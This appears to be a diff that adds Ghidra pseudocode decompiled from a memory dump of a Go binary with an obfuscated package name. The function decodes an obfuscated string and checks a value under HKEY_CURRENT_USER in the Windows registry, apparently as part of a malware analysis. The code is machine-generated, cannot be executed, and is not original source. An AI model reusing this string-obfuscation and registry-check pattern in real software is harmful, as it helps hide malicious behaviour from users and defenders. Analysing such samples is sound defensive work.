@@ -1,0 +1,161 @@
+// g32tlV65Unf.AvADgi4pCduV @ 0x140534f60
+// selected because: author package g32tlV65Unf
+// Ghidra 12.2 pseudocode of an image rebuilt from charmap.DMP. Static only; never executed. Not original source.
+
+/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
+
+undefined8 g32tlV65Unf_AvADgi4pCduV(void)
+
+{
+  char cVar1;
+  char cVar2;
+  undefined8 *puVar3;
+  int iVar4;
+  undefined8 extraout_RBX;
+  undefined8 uVar5;
+  uint uVar6;
+  undefined8 extraout_RSI;
+  uint extraout_RSI_00;
+  undefined *extraout_RDI;
+  uint uVar7;
+  int unaff_R14;
+  undefined1 auVar8 [16];
+  byte abStack_68 [56];
+  undefined8 uStack_30;
+  undefined8 uStack_28;
+  code *pcStack_20;
+  undefined8 uStack_18;
+  code **ppcStack_10;
+  
+  while (&ppcStack_10 <= *(code ****)(unaff_R14 + 0x10)) {
+    func_0x00014006cfa0();
+  }
+  abStack_68[0x37] = 0;
+  abStack_68[0x36] = DAT_14119bdc0;
+  auVar8 = FUN_1400153a0(&UNK_140abf180);
+  uVar5 = auVar8._8_8_;
+  puVar3 = auVar8._0_8_;
+  *puVar3 = 0x45241b9e145f353;
+  puVar3[1] = 0xfb73f28cef69dcd7;
+  *(undefined8 *)((int)puVar3 + 0xf) = 0x642d6957c3b994fb;
+  *(undefined8 *)((int)puVar3 + 0x17) = 0x781e75148e7d66de;
+  *(undefined8 *)((int)puVar3 + 0x1f) = 0x7e73216556635e65;
+  *(undefined8 *)((int)puVar3 + 0x27) = 0x89d4c0cfa1c86ebc;
+  *(char *)((int)puVar3 + 0x2a) = *(char *)((int)puVar3 + 0x2a) + -0x4f;
+  *(byte *)((int)puVar3 + 0x17) = *(byte *)((int)puVar3 + 0x17) ^ 0x2b;
+  *(byte *)((int)puVar3 + 0x12) = *(char *)((int)puVar3 + 0x12) + abStack_68[0x36];
+  *(byte *)((int)puVar3 + 4) = *(byte *)((int)puVar3 + 4) ^ abStack_68[0x36];
+  abStack_68[0] = 0x17;
+  abStack_68[1] = 0x26;
+  abStack_68[2] = 0x10;
+  abStack_68[3] = 0xf;
+  abStack_68[4] = 0x2e;
+  abStack_68[5] = 0x10;
+  abStack_68[6] = 0x20;
+  abStack_68[7] = 0x24;
+  abStack_68[8] = 0xd;
+  abStack_68[9] = 0x12;
+  abStack_68[10] = 0x18;
+  abStack_68[0xb] = 0xc;
+  abStack_68[0xc] = 0x2e;
+  abStack_68[0xd] = 0x15;
+  abStack_68[0xe] = 0x1d;
+  abStack_68[0xf] = 0x19;
+  abStack_68[0x10] = 0x29;
+  abStack_68[0x11] = 2;
+  abStack_68[0x12] = 7;
+  abStack_68[0x13] = 0x1e;
+  abStack_68[0x14] = 0x2e;
+  abStack_68[0x15] = 0x1b;
+  abStack_68[0x16] = 4;
+  abStack_68[0x17] = 0xb;
+  abStack_68[0x18] = 0x26;
+  abStack_68[0x19] = 9;
+  abStack_68[0x1a] = 0x17;
+  abStack_68[0x1b] = 0x1a;
+  abStack_68[0x1c] = 0xf;
+  abStack_68[0x1d] = 0x17;
+  abStack_68[0x1e] = 1;
+  abStack_68[0x1f] = 0x21;
+  abStack_68[0x20] = 0x26;
+  abStack_68[0x21] = 3;
+  abStack_68[0x22] = 3;
+  abStack_68[0x23] = 0x10;
+  abStack_68[0x24] = 0x29;
+  abStack_68[0x25] = 3;
+  abStack_68[0x26] = 0x27;
+  abStack_68[0x27] = 7;
+  abStack_68[0x28] = 0x11;
+  abStack_68[0x29] = 0x29;
+  abStack_68[0x2a] = 0x1d;
+  abStack_68[0x2b] = 0x2b;
+  abStack_68[0x2c] = 8;
+  abStack_68[0x2d] = 1;
+  abStack_68[0x2e] = 0xc;
+  abStack_68[0x2f] = 0x18;
+  abStack_68[0x30] = 9;
+  abStack_68[0x31] = 0x18;
+  abStack_68[0x32] = 9;
+  abStack_68[0x33] = 0x24;
+  abStack_68[0x34] = 0x11;
+  abStack_68[0x35] = 0x2c;
+  iVar4 = 0;
+  while( true ) {
+    if (0x35 < iVar4) {
+      auVar8 = (*(code *)**(undefined8 **)(_DAT_14119bda8 + 0x28))(puVar3,0x2f,0x2f);
+      auVar8 = golang_org_x_sys_windows_registry_OpenKey
+                         (0x80000001,auVar8._0_8_,auVar8._8_8_,0xf003f);
+      uStack_30 = auVar8._0_8_;
+      if (auVar8._8_8_ != 0) {
+        DAT_14120905d = 0;
+        return 0;
+      }
+      pcStack_20 = FUN_1405352a0;
+      ppcStack_10 = &pcStack_20;
+      abStack_68[0x37] = 1;
+      uStack_18 = uStack_30;
+      auVar8 = FUN_140535300(*(undefined4 *)(_DAT_14119bda8 + 0x20),0xec5e6653f32156df,0xe1f19153,
+                             0xffffff93,0xb6ce9f69);
+      golang_org_x_sys_windows_registry_Key_GetStringValue(uStack_30,auVar8._0_8_,auVar8._8_8_);
+      if (extraout_RDI == (undefined *)0x0) {
+        DAT_14120905d = 1;
+        abStack_68[0x37] = 0;
+        (**ppcStack_10)();
+        return 1;
+      }
+      uStack_28 = _DAT_1410d65a0;
+      if (extraout_RDI == &UNK_140d09240) {
+        cVar2 = FUN_14000c160(&UNK_140d09240,&uStack_28,extraout_RSI);
+        if (cVar2 != '\0') {
+          DAT_14120905d = 0;
+          abStack_68[0x37] = 0;
+          (**ppcStack_10)();
+          return 0;
+        }
+      }
+      DAT_14120905d = 0;
+      abStack_68[0x37] = 0;
+      (**ppcStack_10)();
+      return 0;
+    }
+    uVar6 = (uint)abStack_68[iVar4];
+    uVar7 = (uint)abStack_68[iVar4 + 1];
+    cVar2 = ((abStack_68[iVar4 + 1] ^ abStack_68[iVar4]) + (char)iVar4) - abStack_68[0x36];
+    if (0x2e < uVar6) break;
+    cVar1 = *(char *)(uVar6 + (int)puVar3);
+    if (0x2e < uVar7) {
+      func_0x00014006f260(uVar7,uVar5,0x2f);
+      uVar5 = extraout_RBX;
+      uVar6 = extraout_RSI_00;
+      break;
+    }
+    *(char *)((int)puVar3 + uVar6) = cVar2 + *(char *)(uVar7 + (int)puVar3) + -0x7b;
+    *(char *)((int)puVar3 + uVar7) = cVar2 + cVar1 + -0x7b;
+    iVar4 = iVar4 + 2;
+  }
+  func_0x00014006f260(uVar6 & 0xffffffff,uVar5,0x2f);
+  FUN_140039360();
+  return 0;
+}
+
+
